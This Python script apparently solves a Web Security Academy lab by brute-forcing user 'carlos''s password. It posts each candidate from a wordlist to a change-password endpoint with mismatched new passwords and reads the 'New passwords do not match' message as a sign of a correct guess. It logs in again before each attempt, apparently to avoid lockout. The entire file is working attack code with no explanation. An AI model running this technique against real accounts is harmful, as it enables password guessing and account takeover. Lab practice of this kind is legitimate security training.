import requests
from requests.cookies import RequestsCookieJar


def send_request(password: str, cookies) -> str:
    data = {
        'username': 'carlos',
        'current-password': password,
        'new-password-1': 'bla',
        'new-password-2': 'blub'
    }
    response = requests.post('https://acf71fc41eff88b0c08c06e7003400b1.web-security-academy.net/my-account/change-password', data=data, cookies=cookies)
    content = response.content.decode('utf-8')
    return content


def login() -> RequestsCookieJar:
    data = {
      'username': 'wiener',
      'password': 'peter'
    }

    response = requests.post('https://acf71fc41eff88b0c08c06e7003400b1.web-security-academy.net/login', data=data, allow_redirects=False)
    return response.cookies


def is_password_valid(response_content: str) -> bool:
    return 'New passwords do not match' in response_content


def bf_password():
    # a login (of any user) is required to send the change-password request
    cookies = login()
    with open('../../password-based/passwords.txt', 'r') as f:
        data = f.read().splitlines()
    for password in data:
        cookies = login()
        content = send_request(password, cookies)
        if is_password_valid(content):
            return password
    raise AssertionError('no password found')


print(bf_password())
